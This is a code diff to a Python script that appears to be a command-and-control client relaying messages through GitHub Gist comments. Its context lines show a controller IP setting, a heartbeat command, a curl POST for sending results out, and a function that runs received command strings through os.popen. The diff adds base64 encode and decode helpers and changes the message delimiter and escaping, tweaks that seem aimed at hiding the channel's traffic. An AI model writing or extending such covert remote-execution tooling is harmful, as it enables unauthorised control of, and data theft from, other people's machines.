@@ -2,6 +2,7 @@ import os
 import re
 import json
 from enum import Enum
+import base64
 
 INITIALIZED = False
 CONTROLLER_IP = ""
@@ -10,7 +11,7 @@ GIST_ID = ""
 
 REFRESH_DELAY = 20 # seconds
 BROADCAST = 0
-DELIM = ':'
+DELIM = '•'
 
 class Command(Enum):
     HEARTBEAT = 0
@@ -46,7 +47,7 @@ def init_config():
 def post_gist_comment(msg):
     assert INITIALIZED
 
-    msg = str(msg.encode('utf-8'))[2:-1]
+    msg = msg.encode('unicode_escape').decode('utf-8')
 
     cmd = "curl\
             -X POST \
@@ -146,3 +147,11 @@ def perform_command(cmd):
     stream = os.popen(cmd)
     out = stream.read()
     return out
+
+
+def text_to_base64(s):
+    return base64.b64encode(s.encode('utf-8')).decode('utf-8')
+
+
+def base64_to_text(b):
+    return base64.b64decode(b.encode('utf-8')).decode('utf-8')
